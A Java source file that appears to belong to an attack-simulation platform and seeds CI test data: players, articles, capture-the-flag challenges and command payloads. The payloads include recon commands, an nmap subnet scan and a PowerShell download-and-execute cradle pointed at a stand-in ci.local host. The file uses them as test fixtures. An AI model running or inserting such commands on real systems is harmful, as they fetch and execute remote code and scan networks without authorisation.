package io.openaev.datapack.packs;

import io.openaev.database.model.*;
import io.openaev.database.model.ChallengeFlag.FLAG_TYPE;
import io.openaev.database.repository.ArticleRepository;
import io.openaev.database.repository.ChannelRepository;
import io.openaev.database.repository.ChallengeFlagRepository;
import io.openaev.database.repository.ChallengeRepository;
import io.openaev.datapack.DataPack;
import io.openaev.rest.payload.form.PayloadCreateInput;
import io.openaev.rest.payload.service.PayloadCreationService;
import io.openaev.rest.user.PlayerService;
import io.openaev.rest.user.form.player.PlayerInput;
import io.openaev.rest.challenge.form.ChallengeInput;
import io.openaev.rest.challenge.form.FlagInput;
import io.openaev.service.DataPackService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.context.annotation.Profile;
import org.springframework.stereotype.Component;

import java.util.Collections;
import java.util.List;

@Component
@Profile("ci")
@Slf4j
public class V20260101_CI_pack extends DataPack {

  private final PlayerService playerService;
  private final ChannelRepository channelRepository;
  private final ArticleRepository articleRepository;
  private final ChallengeRepository challengeRepository;
  private final ChallengeFlagRepository challengeFlagRepository;
  private final PayloadCreationService payloadCreationService;

  public V20260101_CI_pack(
          DataPackService dataPackService,
          PlayerService playerService,
          ChannelRepository channelRepository,
          ArticleRepository articleRepository,
          ChallengeRepository challengeRepository,
          ChallengeFlagRepository challengeFlagRepository,
          PayloadCreationService payloadCreationService) {
    super(dataPackService);
    this.playerService = playerService;
    this.channelRepository = channelRepository;
    this.articleRepository = articleRepository;
    this.challengeRepository = challengeRepository;
    this.challengeFlagRepository = challengeFlagRepository;
    this.payloadCreationService = payloadCreationService;
  }

  @Override
  protected boolean doProcess() {
    log.info("CI DataPack — injecting seed data (players, articles, challenges, payloads)");
    try {
      createPlayers();
      Channel channel = createChannel();
      createArticles(channel);
      createChallenges();
      createPayloads();
      log.info("CI DataPack — seed data injected successfully");
      return true;
    } catch (Exception e) {
      log.error("CI DataPack — failed to inject seed data", e);
      return false;
    }
  }

  private void createPlayers() {
    record P(String firstname, String lastname, String email) {}
    List.of(
            new P("Alice",  "Martin",  "alice.martin@ci.local"),
            new P("Bob",    "Dupont",  "bob.dupont@ci.local"),
            new P("Carol",  "Schmidt", "carol.schmidt@ci.local"),
            new P("David",  "Leroy",   "david.leroy@ci.local"),
            new P("Eve",    "Moreau",  "eve.moreau@ci.local")
    ).forEach(p -> {
      PlayerInput input = new PlayerInput();
      input.setEmail(p.email());
      input.setFirstname(p.firstname());
      input.setLastname(p.lastname());
      playerService.createPlayer(input);
      log.info("CI DataPack — player created: {}", p.email());
    });
  }

  private Channel createChannel() {
    Channel channel = new Channel();
    channel.setName("CI News Channel");
    channel.setType("newspaper");
    Channel saved = channelRepository.save(channel);
    log.info("CI DataPack — channel created: {}", saved.getId());
    return saved;
  }

  private void createArticles(Channel channel) {
    record A(String name, String author, String content) {}
    List.of(
            new A("Threat Intelligence Basics",
                    "CI Bot",
                    "Introduction to threat intelligence concepts for CI testing purposes."),
            new A("Incident Response Playbook",
                    "CI Bot",
                    "Step-by-step incident response procedures. Used for CI seed data only."),
            new A("Phishing Awareness",
                    "CI Bot",
                    "Phishing campaign awareness content for end-user training simulations.")
    ).forEach(a -> {
      Article article = new Article();
      article.setName(a.name());
      article.setAuthor(a.author());
      article.setContent(a.content());
      article.setChannel(channel);
      article.setShares(0);
      article.setLikes(0);
      article.setComments(0);
      articleRepository.save(article);
      log.info("CI DataPack — article created: {}", a.name());
    });
  }

  private void createChallenges() {
    record C(String name, String category, String content, double score, String flag) {}
    List.of(
            new C("Find the C2",
                    "Network",
                    "Identify the C&C server in the provided network capture.",
                    100, "FLAG{ci-find-the-c2}"),
            new C("Decode the Payload",
                    "Reverse Engineering",
                    "Reverse engineer the obfuscated payload and extract the hidden flag.",
                    200, "FLAG{ci-decode-payload}"),
            new C("Log Analysis",
                    "Forensics",
                    "Analyze the provided logs and identify the initial access vector.",
                    150, "FLAG{ci-log-analysis}"),
            new C("Privilege Escalation",
                    "Exploitation",
                    "Exploit the misconfigured sudo rule to gain root access.",
                    300, "FLAG{ci-privesc}")
    ).forEach(c -> {
      FlagInput flagInput = new FlagInput();
      flagInput.setType(FLAG_TYPE.VALUE.name());
      flagInput.setValue(c.flag());

      ChallengeInput input = new ChallengeInput(
              c.name(),
              c.category(),
              c.content(),
              c.score(),
              3,
              List.of(),
              List.of(),
              List.of(flagInput)
      );

      Challenge challenge = new Challenge();
      challenge.setUpdateAttributes(input);
      List<ChallengeFlag> flags = input.flags().stream().map(fi -> {
        ChallengeFlag cf = new ChallengeFlag();
        cf.setType(FLAG_TYPE.valueOf(fi.getType()));
        cf.setValue(fi.getValue());
        cf.setChallenge(challenge);
        return cf;
      }).toList();
      challenge.setFlags(flags);

      challengeRepository.save(challenge);
      log.info("CI DataPack — challenge created: {}", c.name());
    });
  }


  private void createPayloads() {
    record P(String name, String executor,
             String content, Endpoint.PLATFORM_TYPE platform) {}
    List.of(
            new P("CI — Whoami",
                    "bash",
                    "whoami && hostname && id",
                    Endpoint.PLATFORM_TYPE.Linux),
            new P("CI — System Info",
                    "powershell",
                    "Get-ComputerInfo | Select-Object CsName, OsName, OsVersion",
                    Endpoint.PLATFORM_TYPE.Windows),
            new P("CI — Network Scan",
                    "bash",
                    "nmap -sV -p 22,80,443,3389 192.168.0.0/24",
                    Endpoint.PLATFORM_TYPE.Linux),
            new P("CI — DNS Exfil Sim",
                    "powershell",
                    "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://ci.local/test')",
                    Endpoint.PLATFORM_TYPE.Windows)
    ).forEach(p -> {
      PayloadCreateInput input = new PayloadCreateInput();
      input.setType(Command.COMMAND_TYPE);
      input.setName(p.name());
      input.setSource(Payload.PAYLOAD_SOURCE.MANUAL);
      input.setStatus(Payload.PAYLOAD_STATUS.VERIFIED);
      input.setPlatforms(new Endpoint.PLATFORM_TYPE[]{p.platform()});
      input.setExecutor(p.executor());
      input.setContent(p.content());
      input.setAttackPatternsIds(Collections.emptyList());
      input.setTagIds(Collections.emptyList());
      input.setDomainIds(Collections.emptyList());
      payloadCreationService.createPayload(input);
      log.info("CI DataPack — payload created: {}", p.name());
    });
  }
}